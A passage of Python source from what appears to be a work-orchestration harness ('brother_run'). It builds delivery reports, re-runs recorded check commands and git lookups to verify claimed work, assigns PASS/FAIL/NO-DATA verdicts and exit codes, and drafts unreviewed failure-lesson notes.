        # NEVER CLAIMED BUT ALREADY REFUSED: _refuse_broken_precheck_units
        # and _refuse_exhausted_units stamp `integration_refused` plus
        # `refused_before_work` on a unit they pulled out of the plan before
        # the drain, so it was never in the plan for a worker to claim. Its
        # own recorded reason is the one to print here, not the generic
        # "held back" sentence below, which says nothing about why. The
        # `refused_before_work` stamp is what tells such a row from one
        # whose stale `integration_refused` came from an earlier round's
        # verifier: an exhausted unit still HOLDS an old claim (abandoned,
        # or failed in the run this one resumed), so `held is None` alone
        # would miss it and print "it was started and ended claimed".
        if row.get("refused_before_work") or (
                held is None and row.get("integration_refused")):
            refused.append((uid, str(row.get("integration_refused"))))
            continue
        # PLAIN WORDS FIRST, THE ENGINE'S OWN WORDS AFTER. The old line read
        # "claimed but ended state=failed: F1 failed scope=CLEAN
        # integrated=False" at a person who asked for a working feature. The
        # plain sentence is what they can act on; the engine's line stays
        # because it names the specific file or base the refusal was about,
        # and a refusal stripped of its specifics is not a refusal a person
        # can answer.
        base = ("it was never started this run, because a dependency, a full "
                "slot or the scheduler's own admission check held it back"
                if held is None
                else "it was started and ended %s" % held.get("state"))
        detail = _reason_for(uid, loop_text)
        plain = next((sentence for word, sentence in PLAIN_VERDICTS
                      if word.lower() in detail.lower()), "")
        reason = "; ".join([p for p in (base, plain) if p])
        if detail:
            reason += "; the engine's own words: %s" % detail
        refused.append((uid, reason))

    lines = ["brother_run: delivery report for %r" % record.get("outcome"),
             "  work_id: %s" % record.get("work_id"),
             "  canonical revision before: %s" % (before or NODATA),
             "  canonical revision after:  %s" % (after or NODATA)]

    if changed:
        lines.append("  files changed (%d): %s" % (len(changed),
                                                   ", ".join(changed)))
    elif before and after and before != after:
        lines.append("  files changed: NO-DATA (the revision range could not "
                     "be read)")
    else:
        lines.append("  files changed (0): none")

    # EVERY UNIT REFUSED BEFORE ANY WORKER STARTED (the toy's run 4,
    # 2026-09-03: two empty rounds and an empty verified section over a run
    # that never claimed anything): one line that says so, in place of an
    # "integrated (0): none" block a stranger reads as a failed delivery
    # rather than a run that stopped at the door. The rows' own
    # `refused_before_work` stamps are the fact this reads; the refusals
    # themselves still list below, one reason each, and the exit code stays
    # 1 (refused) under _exit_code_for's own rule.
    before_work = [uid for uid, row in rows.items()
                   if row.get("refused_before_work")]
    if rows and not integrated and len(before_work) == len(rows):
        lines.append("  nothing was verified: all %d piece(s) were refused "
                     "before any worker started, so nothing was claimed or "
                     "run" % len(rows))
    else:
        lines.append("  integrated (%d):" % len(integrated))
        if integrated:
            for uid in integrated:
                check = (rows.get(uid) or {}).get("done_check") or "no done_check"
                lines.append("    %-10s verified by: %s" % (uid, check))
        else:
            lines.append("    none")
    lines.append("  refused (%d):" % len(refused))
    for uid, reason in refused:
        lines.append("    %-10s %s" % (uid, reason[:160]))

    # THE RECEIPT, one plain sentence per unit, and the scoping sentence
    # under all of them. Option A of the door redesign, 2026-08-31: the
    # evidence was already being stored and re-executed (_verify_evidence,
    # above), and a person still had to take the word "integrated" on trust.
    # Nothing here is invented: every command, exit code and refusal reason
    # comes from the claim store's own evidence or from the refusal list
    # this same function just built.
    #
    # P9 (doc 12.6): target_revision, env_lock and per-unit data_identity,
    # computed once from `cwd` (this call's own docstring above), handed to
    # receipts_for so every receipt below carries them beside harness_revision.
    target_revision = after or NODATA
    env_lock = _env_lock(cwd)
    data_identity_by_id = {uid: _data_identity_for_row(rows.get(uid) or {}, cwd)
                           for uid in rows}
    receipts = receipt_door.receipts_for(
        record, claims, refused, log_path, target_revision=target_revision,
        env_lock=env_lock, data_identity_by_id=data_identity_by_id)
    # P12: the loop closes here, right beside the receipts it reads. One
    # recurrence receipt per unit (bm_recurrence.record_receipt) and, for
    # every unit that did not PASS, a drafted lesson file under this run's
    # own directory, never in the vault itself. See the function's own
    # docstring for why this is safe against build_report's two-pass call
    # in main() and for what "no run directory" does (nothing, honestly).
    _record_recurrence_and_draft_lessons(record, receipts,
                                         journal.run_dir_from_env())
    lines.append("")
    lines.append("  what this run proved, one line per piece of work:")
    verdict_counts = {"PASS": 0, "FAIL": 0, "NO-DATA": 0}
    # A RESUMED RUN NAMES BOTH ENGINES (the toy's runs 3 and 4, 2026-09-03:
    # a resumed record carried the creating engine's prechecks and the
    # resuming engine's verdicts, and the receipt named one or neither).
    # receipt_sentence already names `harness_revision`, the engine that
    # CREATED the record (stamped once on disk by main(), never
    # overwritten); the second field, `harness_revision_resumed`, is the
    # engine that resumed it and produced the receipt being read, added
    # here on the same line, same twelve-hex rule, only when the run was
    # resumed at all. A fresh run's line is byte for byte what it was.
    resumed_by = str(record.get("harness_revision_resumed") or "")
    resumed_note = ""
    if resumed_by:
        resumed_note = " Resumed by harness %s." % (
            NODATA if resumed_by.startswith(NODATA) else resumed_by[:12])
    for receipt in receipts:
        verdict = _verdict_for(receipt)
        verdict_counts[verdict] += 1
        lines.append("    " + receipt_door.receipt_sentence(receipt)
                     + resumed_note + " verdict: %s" % verdict)
    # P5 (persona integration, gap P5): the profession-aware question's own
    # line on the receipt, the record's `human_decision` repeated verbatim
    # when a live person answered it, or an explicit NO-DATA line naming
    # the metric that was never asked (unattended mode's own budget: zero
    # questions) or never answered (the stream closed before one arrived).
    # Neither field is ever present unless door.py's own compute_challenge
    # decided a question was warranted, so a plain run's report carries
    # neither line, unchanged from before this row.
    human_decision = record.get("human_decision")
    pending_challenge = record.get("pending_challenge")
    if human_decision:
        lines.append("  human decision (%s): %s -> %s"
                     % (human_decision.get("lens") or NODATA,
                        human_decision.get("question") or NODATA,
                        human_decision.get("answer") or NODATA))
    elif pending_challenge:
        lines.append("  human decision (%s): %s; %s never answered "
                     "(zero questions in unattended mode; run "
                     "--interactive to answer it)"
                     % (pending_challenge.get("lens") or NODATA, NODATA,
                        pending_challenge.get("question") or NODATA))
    lines.append("")
    lines.append("  " + receipt_door.SCOPING_SENTENCE)
    if price_block is not None:
        lines.append("")
        lines.append("  price (said before the run):")
        for field in PRICE_FIELDS:
            lines.append("    %s: %s" % (field, price_block.get(field, NODATA)))
    if cost_block is not None:
        lines.append("")
        lines.append("  cost:")
        for field in COST_FIELDS:
            lines.append("    %s: %s" % (field, cost_block.get(field, NODATA)))
    lines.append("")
    lines.append("  verdicts: %d PASS, %d FAIL, %d NO-DATA"
                 % (verdict_counts["PASS"], verdict_counts["FAIL"],
                    verdict_counts["NO-DATA"]))
    return "\n".join(lines), integrated, refused


def _verdict_for(receipt):
    """The README's headline vocabulary (PASS, FAIL, NO-DATA), looked up from
    the receipt state receipt_door.receipts_for() already computed for this
    same report: never a second judgement, the same fact under the word a
    stranger can search the report for. "verified" (the recorded check
    re-executed and exited 0) is PASS. "refused" is FAIL. Everything else
    ("no-data": unchecked, no re-executable check, could not re-execute) is
    NO-DATA, and NO-DATA is never reported as a pass."""
    return {"verified": "PASS", "refused": "FAIL"}.get(
        receipt.get("state"), "NO-DATA")


#: P12 (persona plan row P12, 2026-09-04): the journal event types the
#: recurrence loop reads and writes, named once so a reader can grep the
#: whole chain by string. VAULT_RECALL is not written by anything in this
#: file: it is the extension point a future recall hook or worker journals
#: onto, {"records": [{"slug","path","state","line"}, ...]} per event, the
#: exact shape products/brothermode/tools/vault_recall_hook.lesson_states
#: already produces. Nothing writing it yet is not a bug here: an empty
#: `recalled` list reads honestly as "nothing surfaced for this unit",
#: never as a fabricated one.
VAULT_RECALL_EVENT_TYPE = "vault.recall"
RECURRENCE_RECORDED_EVENT_TYPE = "recurrence.receipt_recorded"
RECURRENCE_FAILED_EVENT_TYPE = "recurrence.receipt_failed"
LESSON_DRAFTED_EVENT_TYPE = "lesson.drafted"
LESSON_DRAFT_FAILED_EVENT_TYPE = "lesson.draft_failed"
LESSONS_DIRNAME = "lessons"

#: bm_recurrence.py loaded by path once and cached, the same technique
#: bm_playbook.py already uses to reach the same module: it ships as a
#: plugin tool under products/brothermode/tools, never as an installed
#: package, so there is nothing on sys.path to `import bm_recurrence`
#: normally. None means "could not load it", read at every call site as a
#: reason to skip, never to crash a delivery report over.
_BM_RECURRENCE_MODULE = None


def _load_bm_recurrence():
    global _BM_RECURRENCE_MODULE
    if _BM_RECURRENCE_MODULE is not None:
        return _BM_RECURRENCE_MODULE
    path = os.path.join(REPO_ROOT, "products", "brothermode", "tools",
                        "bm_recurrence.py")
    if not os.path.isfile(path):
        return None
    try:
        import importlib.util
        spec = importlib.util.spec_from_file_location("bm_recurrence", path)
        mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(mod)
    except Exception:  # sbe: allow-silent a broken recurrence module must never break a delivery report; the caller reads None as "skip"
        return None
    _BM_RECURRENCE_MODULE = mod
    return mod


def _recalled_records_for_unit(events, uid):
    """Every {"slug","path","state","line"} dict any VAULT_RECALL_EVENT_TYPE
    journal event for this unit carried, in event order, flattened across
    however many such events exist. `events` is journal.read()'s own list,
    read once by the caller; nothing here re-reads the file. No matching
    event reads as [], honestly: nothing was recalled for this unit, never
    a guess."""
    out = []
    for event in events or ():
        if event.get("type") != VAULT_RECALL_EVENT_TYPE:
            continue
        if event.get("unit_id") != uid:
            continue
        out.extend((event.get("payload") or {}).get("records") or [])
    return out


def _existing_event_id(events, event_type, uid):
    """The event_id of an event of `event_type` already on this unit's
    chain, or None. Read before writing a new one of the same type: main()
    calls build_report twice per run by design (a first pass to compute
    `refused` for the cost block, then the real pass), and this is what
    keeps a second pass from recording the same receipt twice or drafting
    the same lesson file twice."""
    for event in events or ():
        if event.get("type") == event_type and event.get("unit_id") == uid:
            return event.get("event_id")
    return None


def _lesson_note_text(uid, receipt, run_id):
    """A vault-shaped failure note for a refused or NO-DATA unit, honest
    about where it came from: source_receipt names the run, human_approved
    is always false because nobody has reviewed it yet. Satisfies
    bm_vault_lint.py's own contract field for field: BASE_REQUIRED (id,
    type, status, created) plus EXTRA_REQUIRED_BY_TYPE["failure"] =
    ("symptom",). id is minted the same shape bm_vault_ids.mint() produces
    (n- plus 16 hex characters) without importing that module for one
    line."""
    reason = str(receipt.get("reason") or "").strip()
    symptom = (reason or ("unit %r produced no verifiable evidence "
                          "(NO-DATA receipt)" % uid)).replace("\n", " ")[:400]
    lines = [
        "---",
        "id: n-%s" % uuid.uuid4().hex[:16],
        "type: failure",
        "status: open",
        "created: %s" % datetime.date.today().isoformat(),
        "source_receipt: %s" % run_id,
        "human_approved: false",
        "symptom: %s" % symptom,
        "---",
        "",
        "# %s: %s" % (uid, str(receipt.get("objective") or "").strip() or NODATA),
        "",
        "Drafted automatically by brother_run.py from a refused or NO-DATA "
        "receipt (P12, the recurrence loop). Nobody has reviewed this: it "
        "stays out of the vault and human_approved stays false until a "
        "person promotes it.",
        "",
        "- unit: %s" % uid,
        "- verdict: %s" % _verdict_for(receipt),
        "- command: %s" % (receipt.get("command") or NODATA),
        "- reason: %s" % (reason or NODATA),
        "- run: %s" % run_id,
        "",
    ]
    return "\n".join(lines)


def _record_recurrence_and_draft_lessons(record, receipts, run_dir):
    """P12: one recurrence receipt per unit (bm_recurrence.record_receipt),
    surfaced/applied read off this unit's own VAULT_RECALL_EVENT_TYPE
    journal events via receipt_door.applied_memory (E74's own partition,
    never recomputed here), before_first_write always True because a
    PreToolUse-shaped recall structurally happens before the write it
    precedes. Then, for every unit whose receipt did not read PASS, a
    drafted lesson file under <run_dir>/lessons/, never in the real vault.

    BEST EFFORT AND IDEMPOTENT, not merely best effort: `events` is read
    once and both writers below check it for an event they already wrote
    before writing another, which is what makes this safe against
    build_report's own two-pass call in main() (see that function's
    comment) without needing a lock. A missing run directory writes
    nothing at all: journal.py's own rule, "no run directory is not a
    failure", a receipt about a run needs a run to sit beside."""
    if not run_dir:
        return
    events = journal.read(run_dir) or []
    run_id = os.path.basename(os.path.normpath(run_dir))
    bm_recurrence = _load_bm_recurrence()
    for receipt in receipts:
        uid = receipt.get("id")
        if not uid:
            continue
        recurrence_event_id = _existing_event_id(
            events, RECURRENCE_RECORDED_EVENT_TYPE, uid)
        if recurrence_event_id is None and bm_recurrence is not None:
            recalled = _recalled_records_for_unit(events, uid)
            section = receipt_door.applied_memory(recalled)
            surfaced = sorted({entry.get("slug") for values in section.values()
                               for entry in values if entry.get("slug")})
            applied = sorted({entry.get("slug")
                              for entry in section.get("applied", [])
                              if entry.get("slug")})
            try:
                bm_recurrence.record_receipt(
                    "%s:%s" % (run_id, uid), surfaced, applied, [], "",
                    True, db_path=None)
            except Exception as exc:  # a receipt store failure (a locked or full db, a bad contract call) must never stop the run being reported
                journal.append(run_dir, RECURRENCE_FAILED_EVENT_TYPE,
                               parent_ids=journal.previous(run_dir),
                               unit_id=uid,
                               payload={"error": str(exc)[:200]})
            else:
                recurrence_event_id = journal.append(
                    run_dir, RECURRENCE_RECORDED_EVENT_TYPE,
                    parent_ids=journal.previous(run_dir), unit_id=uid,
                    payload={"surfaced": len(surfaced), "applied": len(applied)})
                if recurrence_event_id:
                    events.append({"type": RECURRENCE_RECORDED_EVENT_TYPE,
                                   "unit_id": uid,
                                   "event_id": recurrence_event_id})
        if _verdict_for(receipt) == "PASS":
            continue
        if _existing_event_id(events, LESSON_DRAFTED_EVENT_TYPE, uid):
            continue
        lessons_dir = os.path.join(run_dir, LESSONS_DIRNAME)
        path = os.path.join(lessons_dir, _safe_uid_segment(uid) + ".md")
        if os.path.isfile(path):
            continue
        try:
            os.makedirs(lessons_dir, exist_ok=True)
            with open(path, "w", encoding="utf-8") as fh:
                fh.write(_lesson_note_text(uid, receipt, run_id))
        except OSError as exc:
            journal.append(run_dir, LESSON_DRAFT_FAILED_EVENT_TYPE,
                           parent_ids=journal.previous(run_dir), unit_id=uid,
                           payload={"error": str(exc)[:200]})
            continue
        journal.append(
            run_dir, LESSON_DRAFTED_EVENT_TYPE,
            parent_ids=([recurrence_event_id] if recurrence_event_id
                       else journal.previous(run_dir)),
            unit_id=uid,
            payload={"path": os.path.relpath(path, run_dir),
                    "verdict": _verdict_for(receipt)})


def _exit_code_for(receipts, refused):
    """(code, reason). exit-code-convention-v1 (rule 3, the zero-context
    critic, 2026-09-03): `return 1 if refused else 0` let a run whose every
    receipt was NO-DATA exit 0, and a CI consumer reads that as success. The
    estate's real convention, read from the same verdicts a person already
    sees printed under "what this run proved": 0 ONLY when this run proved
    something (at least one PASS) and refused nothing; 1 when any unit, or
    the verifier itself, refused (a FAIL receipt with no matching entry in
    `refused` is the verifier's own refusal, caught the same way); 2 when
    nothing was refused but nothing was proven either (every receipt
    NO-DATA, or no units at all), which is neither a failure nor a delivery, and
    treating it as either would be a guess this function refuses to make."""
    verdicts = [_verdict_for(r) for r in receipts]
    if refused:
        return 1, ("%d unit(s) refused: %s"
                   % (len(refused),
                      "; ".join("%s: %s" % (uid, reason[:120])
                               for uid, reason in refused)))
    if "FAIL" in verdicts:
        return 1, ("a unit's receipt read FAIL with no matching entry in "
                   "this run's own refused list; the verifier itself "
                   "refused")
    if not verdicts:
        return 2, "no units were in this run's Work document at all"
    if "PASS" not in verdicts:
        return 2, ("nothing in this run was verified (0 PASS, %d NO-DATA); "
                   "a run that refused nothing but proved nothing is not "
                   "the same thing as success" % verdicts.count("NO-DATA"))
    return 0, ("%d unit(s) verified and none was refused"
              % verdicts.count("PASS"))


def _git_object_type(cwd, rev):
    """The type git reports for `rev` (commit, tree, blob...), or None when it
    does not resolve at all. `git cat-file -t` exits nonzero (the skeptic
    measured 128) for anything it cannot find, which is exactly the case a
    fabricated or copy-pasted revision produces."""
    try:
        proc = subprocess.run(["git", "cat-file", "-t", rev], cwd=cwd,
                              capture_output=True, text=True, timeout=30)
    except Exception:  # noqa: BLE001  # sbe: allow-silent becomes "does not resolve"
        return None
    return proc.stdout.strip() if proc.returncode == 0 else None


def _missing_artifacts(cwd, rev, owns):
    """Every declared path in `owns` that is NOT present in `cwd`'s repo at
    `rev`, checked with `git cat-file -e <rev>:<path>` so this reads the
    revision the record names rather than the working tree, which may have
    moved on since. Never raises."""
    missing = []
    for path in owns or []:
        try:
            proc = subprocess.run(
                ["git", "cat-file", "-e", "%s:%s" % (rev, path)], cwd=cwd,
                capture_output=True, text=True, timeout=30)
        except Exception:  # noqa: BLE001  # sbe: allow-silent counts as missing
            missing.append(path)
            continue
        if proc.returncode != 0:
            missing.append(path)
    return missing


def _reexecute_check(command, cwd, recorded_exit_code, runner=None):
    """(ok, reason_or_None). Actually RUNS `command` in `cwd` right now and
    compares the real exit code against what the claim recorded, the same
    way integrate.py's own _run_check does it (shell=True, cwd set to the
    target repository, a 600 second timeout): this is the fix for the
    skeptic's exact finding, that shape checks alone (non-empty command, an
    integer exit code, output present, a resolving canonical rev) let a
    FORGED exit code of 0 survive next to a check that actually fails or
    names a file that was never committed. Honest cost, paid deliberately:
    this re-runs every unit's check once more at integration-verification
    time, because a record that merely describes a check is not the same
    thing as a record that reproduces it. A command that cannot be run at
    all right now (not found, times out, any exception) is a REFUSAL naming
    why, never a silent pass; NO-DATA is never a pass."""
    runner = runner or (lambda cmd, **kw: subprocess.run(
        cmd, capture_output=True, text=True, cwd=cwd, shell=True,
        timeout=CHECK_RUN_TIMEOUT_SECONDS))
    try:
        proc = runner(command)
    except Exception as exc:  # noqa: BLE001
        return False, ("the recorded check could not be re-executed just now: "
                       "%s; a check that cannot be reproduced is a refusal, "
                       "never a silent pass" % exc)
    if proc.returncode != recorded_exit_code:
        tail = ((proc.stdout or "") + (proc.stderr or "")).strip()
        lines = tail.splitlines()
        tail = "\n".join(lines[-5:]) if len(lines) > 5 else tail
        return False, ("the recorded check %r was re-executed and exited %d, "
                       "not the recorded %d; the evidence does not "
                       "reproduce. Last output:\n%s"
                       % (command, proc.returncode, recorded_exit_code,
                          tail or "(no output)"))
    return True, None


#: Stderr fragments a check that CANNOT RUN AT ALL tends to print, distinct
#: from an ordinary failing assertion (rule 4, the zero-context critic,
#: 2026-09-03: "a syntax error in a python -c string, a missing
#: interpreter"). A check matching one of these before the work and again
#: after, unchanged, is not proving anything about the work either way.
BROKEN_CHECK_STDERR_PATTERNS = (
    "SyntaxError", "command not found", "No such file or directory")


def _check_looks_broken(stderr_text):
    """True when `stderr_text` names one of BROKEN_CHECK_STDERR_PATTERNS: a
    plain substring test is enough here, because these are the interpreter's
    and the shell's own fixed wording, not a person's free text a check
    could coincidentally echo."""
    text = stderr_text or ""
    return any(p in text for p in BROKEN_CHECK_STDERR_PATTERNS)


def _check_passes_now(command, cwd, runner=None, capture=None):
    """(passed_or_None, exit_code_or_None, looks_broken, note). CHECK
    DISCRIMINATION (the toy-repo finding, 2026-09-03: a unit named "add a
    type guard to add()" changed zero files and still scored a verified
    receipt, because its own done_check already passed on the untouched
    repository). Run the SAME way _reexecute_check runs its own re-check
    (shell=True, this `cwd`, the same CHECK_RUN_TIMEOUT_SECONDS), but BEFORE
    any worker has touched a single unit, so a check that was already true
    of the repository as it stood is named as such rather than credited to
    work that never happened.

    Returns (True, 0, False, None) when the check already passes, (False,
    exit_code, looks_broken, None) when it does not (the ordinary, expected
    case; `exit_code` is the real captured returncode, for receipts_for to
    later compare against the same check's post-work exit code, and
    `looks_broken` is rule 4's own signal, the zero-context critic,
    2026-09-03: whether the failure looks like the check could never run at
    all rather than an ordinary failing assertion), and (None, None, False,
    note) when the check could not be run at all right now (empty command,
    missing tool, timeout): NO-DATA, never a guess, and never something that
    blocks the run, because a repository whose done_check cannot even be
    attempted yet is not this function's failure to report.

    `capture`, when given a dict, gets `capture["stderr"]` set to the
    command's real captured stderr text: the check-rewrite loop
    (_rewrite_broken_checks, below) needs the SAME stderr this function
    already captures to tell the planner what actually went wrong, and
    running the check a second time just to see its stderr again would
    measure a different moment than the one that set `looks_broken`. Left
    None (every caller that predates this), nothing is captured and the
    4-value return is unchanged."""
    command = str(command or "").strip()
    if not command:
        return None, None, False, "no done_check was recorded for this unit"
    runner = runner or (lambda cmd, **kw: subprocess.run(
        cmd, capture_output=True, text=True, cwd=cwd, shell=True,
        timeout=CHECK_RUN_TIMEOUT_SECONDS))
    try:
        proc = runner(command)
    except Exception as exc:  # noqa: BLE001
        return (None, None, False,
               "the check could not be run before any work: %s" % exc)
    passed = proc.returncode == 0
    stderr_text = getattr(proc, "stderr", None)
    if capture is not None:
        capture["stderr"] = stderr_text
    looks_broken = (not passed) and _check_looks_broken(stderr_text)
    return passed, proc.returncode, looks_broken, None


#: P6 (doc E18/12.6): the five fields an evidence_family E18 unit's own
#: check must write to <run_dir>/evidence/<unit_id>.json before
#: _verify_evidence re-executes it. What was measured, its value, what it
#: beat, the random seed and which holdout set decided it; a number with
#: no seed or no holdout identity is not reproducible, so it is not
#: evidence, whatever the check's exit code says.
E18_FIELDS = ("metric", "value", "baseline", "seed", "holdout_id")


def _read_e18_evidence(run_dir, unit_id):
    """{field: value, ...} when <run_dir>/evidence/<unit_id>.json exists,
    parses as a JSON object and carries every one of E18_FIELDS non-empty;
    otherwise {"missing_reason": "no metric recorded: ..."} naming exactly
    why not (no file, unreadable, not JSON, not an object, or one named
    field absent). Never raises: a malformed evidence file is a fact about
    this unit's proof, not a crash that would abort the whole run."""
    path = os.path.join(run_dir or "", "evidence", "%s.json" % unit_id)
    if not run_dir or not os.path.isfile(path):
        return {"missing_reason": "no metric recorded: no evidence file at %s"
                % path}
    try:
        with open(path, "r", encoding="utf-8") as fh:
            data = json.load(fh)
    except (OSError, json.JSONDecodeError) as exc:
        return {"missing_reason": "no metric recorded: %s could not be read "
                                  "as JSON (%s)" % (path, exc)}
    if not isinstance(data, dict):
        return {"missing_reason": "no metric recorded: %s is not a JSON "
                                  "object" % path}
    for field in E18_FIELDS:
        value = data.get(field)
        if value is None or value == "":
            return {"missing_reason": "no metric recorded: field %r is "
                                      "missing from %s" % (field, path)}
    return {field: data[field] for field in E18_FIELDS}


def _verify_evidence(claim, row, cwd):
    """(ok, evidence_sentence_or_refusal_reason, e18_evidence). Independently
    re-checks the claim store's own account rather than trusting its `state`
    string, because a claim store is just a file: the harsh EVAD 2026-08-31
    drove _mark_integrated directly and it stamped an integrated sentence
    onto a row whose done_check was literally `false` and whose
    canonical_rev was the unvalidated literal deadbeef. Every one of the
    checks below closes exactly that gap, and any one of them failing is a
    refusal, never a stamp. `e18_evidence` is always None except on an `ok`
    return for a row whose evidence_family is E18, where it is
    _read_e18_evidence's own dict (the five fields, or a missing_reason);
    P6 (doc E18/12.6), the statistical evidence a check's bare exit code
    loses in the log."""
    evidence = (claim or {}).get("evidence")
    if not isinstance(evidence, dict):
        return False, ("no evidence was recorded for this claim (no check "
                       "command, exit code, output or canonical revision); a "
                       "delivery record refuses to claim integration it "
                       "cannot prove"), None
    command = str(evidence.get("check_command") or "").strip()
    exit_code = evidence.get("exit_code")
    output = evidence.get("output")
    rev = str(evidence.get("canonical_rev") or "").strip()
    if not command:
        return False, "the claim's evidence names no check command", None
    if not isinstance(exit_code, int) or isinstance(exit_code, bool):
        return False, ("the claim's evidence carries no captured exit code "
                       "for %r; the check may never have run" % command), None
    if exit_code != 0:
        return False, ("the claim's own evidence shows %r exited %d, not 0"
                       % (command, exit_code)), None
    if output is None:
        return False, ("the claim's evidence carries no captured output at "
                       "all"), None
    if not rev:
        return False, "the claim's evidence names no canonical revision", None
    kind = _git_object_type(cwd, rev)
    if kind is None:
        return False, ("the recorded canonical revision %r does not resolve "
                       "in %s (git cat-file -t)" % (rev, cwd)), None
    missing = _missing_artifacts(cwd, rev, row.get("owns") or [])
    if missing:
        return False, ("declared artifact(s) not present in the repository at "
                       "%s: %s" % (rev[:12], ", ".join(missing))), None
    reexec_ok, reexec_reason = _reexecute_check(command, cwd, exit_code)
    if not reexec_ok:
        return False, reexec_reason, None
    note = (" (output truncated to the last 50 lines)"
           if evidence.get("output_truncated") else "")
    body = output if output else "(the check printed nothing)"
    # E59: the ONE place the verifier's independent re-check comes out true,
    # after every refusal above has been passed. The run directory is not in
    # this function's hands (it takes a claim, a row and the TARGET
    # repository), so it comes from the environment brother_run exports.
    run_dir = journal.run_dir_from_env()
    # P6: read AFTER re-execution, per the doc's own words, so the evidence
    # file this reads is the one the check just wrote, not a stale one from
    # an earlier attempt at the same unit.
    e18_evidence = None
    if str(row.get("evidence_family") or "") == "E18":
        e18_evidence = _read_e18_evidence(run_dir, row.get("id"))
    journal.append(run_dir, "evidence.verified",
                   parent_ids=journal.previous(run_dir), unit_id=row.get("id"),
                   payload={"canonical_rev": rev[:12], "check_exit": exit_code})
    return True, ("integrated on canonical at %s; check %r exited 0%s. "
                 "output: %s" % (rev, command, note, body)), e18_evidence


def _mark_integrated(record_path, done_ids, claims, cwd):
    """Write DONE plus REAL, independently-checked evidence into the run's
    Work document for every unit the claim store shows released as done, so
    the next scheduling round sees dependencies satisfied. A unit whose claim
    cannot prove its own delivery REFUSES instead: its row is left off DONE
    and carries `integration_refused` naming why, so a fraudulent or merely
    incomplete claim never becomes an integrated record. Idempotent: an
    already DONE row is left alone.

    Every row this marks DONE is also stamped `files_changed_by_unit`, the
    list integrate_one read at THIS unit's own merge (the claim's evidence
    `files_changed`: canonical's tree between the tip the lane merged onto
    and the tip the merge produced, [] for a lane that committed nothing).
    That is the ZERO-CHANGE fact receipt_door.receipts_for() reads to
    refuse crediting a unit that touched nothing (the toy-repo finding,
    2026-09-03), and it is the unit's own, never the round's (E41, run 5
    critic 3, the same day: both units of one round used to carry the same
    two files, so a unit that changed nothing beside a sibling read PASS).
    A claim whose evidence carries no such list leaves the field absent,
    which the receipt reads as "not recorded", never as "nothing changed".

    Returns (changed, refusals): `changed` is True when any row newly went
    DONE; `refusals` is {unit_id: reason} for every done_id this refused."""
    with open(record_path, "r", encoding="utf-8") as fh:
        doc = json.load(fh)
    # E59: the Work document lives in the run directory, so this writer needs
    # nothing new to find the journal beside it.
    run_dir = os.path.dirname(os.path.abspath(record_path))
    changed = False
    refusals = {}
    touched = False
    for row in (doc.get("rows") or doc.get("units") or []):
        uid = row.get("id")
        if uid not in done_ids or row.get("status") == "DONE":
            continue
        ok, detail, e18_evidence = _verify_evidence(
            (claims or {}).get(uid), row, cwd)
        touched = True
        if ok:
            row["status"] = "DONE"
            row["evidence"] = detail
            evidence = ((claims or {}).get(uid) or {}).get("evidence") or {}
            if isinstance(evidence.get("files_changed"), list):
                row["files_changed_by_unit"] = [
                    str(p) for p in evidence["files_changed"]]
            # P6: the same spot that stamps the claim's evidence onto the
            # row stamps its E18 statistical evidence too, so a fresh
            # record_path re-read later (receipts_for's own input) still
            # carries it; None (every non-E18 row) leaves the row untouched.
            if e18_evidence is not None:
                row["e18_evidence"] = e18_evidence
            changed = True
            # E59: DONE is stamped on the row and recorded as an event in the
            # same breath; the event's parent is the evidence.verified one
            # _verify_evidence just appended for this same unit.
            journal.append(run_dir, "unit.done",
                           parent_ids=journal.previous(run_dir), unit_id=uid,
                           payload={"files_changed": len(
                               row.get("files_changed_by_unit") or [])})
            _write_capsule(run_dir)
        else:
            row["integration_refused"] = detail
            refusals[uid] = detail
    if touched:
        work_record.write_record(record_path, doc)
    return changed, refusals


def _clear_lens_inferred(record_path):
    """P3 (persona integration): a person chose "otherwise" at the intent
    screen, so the Work document's own lens_inferred field is rewritten to
    None, the same load/mutate/write shape _mark_integrated (just above)
    already uses: the file on disk, never the caller's in-memory record,
    which carries a "path" bookkeeping key that must not round-trip onto
    it."""
    with open(record_path, "r", encoding="utf-8") as fh:
        doc = json.load(fh)
    doc["lens_inferred"] = None
    # P5: a corrected lens invalidates any DS-specific challenge machinery
    # door.py stamped alongside it (an assumption or a pending question,
    # both computed FROM the same lens_inferred that was just said to be
    # wrong); cleared here too, or the intent screen would go on to ask
    # about a lens the person just refused.
    doc["challenge_assumption"] = None
    doc["pending_challenge"] = None
    work_record.write_record(record_path, doc)


def _ask_pending_challenge(pending, interactive, stream=None,
                           prompt_stream=None):
    """P5 (persona integration, gap P5): the one profession-aware question
    the intent screen may ask, budgeted to AT MOST ONE per run (this row's
    own budget; persona doc 4.2's own floor for an ML experiment is 1 to
    4, and unattended mode is always zero questions, doc 4.2's own floor
    too). `pending` is the {"lens", "question"} dict door.py stamped on the
    Work document when the tree could not answer the pack's
    challenge_question itself, or None/falsy when nothing is pending.

    Returns the human's answer (a stripped, non-empty string), or None:
    None when nothing is pending, the run is not interactive (the budget
    is ZERO in unattended mode; nothing is ever read from stdin in that
    case), or the stream closed or sent a blank line before a real answer
    arrived. Reads EXACTLY ONE line, never a retry loop like
    _interactive_resolver's option matching above: this never invents an
    answer, an unanswered question is NO-DATA on the receipt, not a
    guess."""
    if not pending or not interactive:
        return None
    question = str(pending.get("question") or "").strip()
    if not question:
        return None
    out = prompt_stream or sys.stderr
    in_stream = stream or sys.stdin
    out.write("\n-- profession-aware question (%s) --\n%s\n> "
              % (pending.get("lens") or NODATA, question))
    out.flush()
    line = in_stream.readline()
    if not line:
        return None
    return line.strip() or None


def _write_human_decision(record_path, pending, answer, also=None):
    """P5: the intent screen's one answer, stamped on the Work document,
    the same load/mutate/write shape _clear_lens_inferred (above) already
    uses. Never invented: `answer` is exactly what a live human typed
    (_ask_pending_challenge, above) and `pending` is exactly the question
    door.py recorded when the tree could not answer it itself.
    `pending_challenge` is cleared in the same write: it is answered now,
    not still pending.

    `also` is the composed remainder (persona doc 5.2): [(pending, answer),
    ...] for every FURTHER pack question this run actually asked and got an
    answer to, stored under the same decision's "also" key rather than in a
    second field, so a reader that only knows the {lens, question, answer}
    shape reads the primary decision unchanged. Empty or None on the
    single-lens path, which is every run before composition landed."""
    with open(record_path, "r", encoding="utf-8") as fh:
        doc = json.load(fh)
    decision = {"lens": pending.get("lens"),
                "question": pending.get("question"),
                "answer": answer}
    if also:
        decision["also"] = [{"lens": p.get("lens"),
                             "question": p.get("question"),
                             "answer": a} for p, a in also]
    doc["human_decision"] = decision
    doc["pending_challenge"] = None
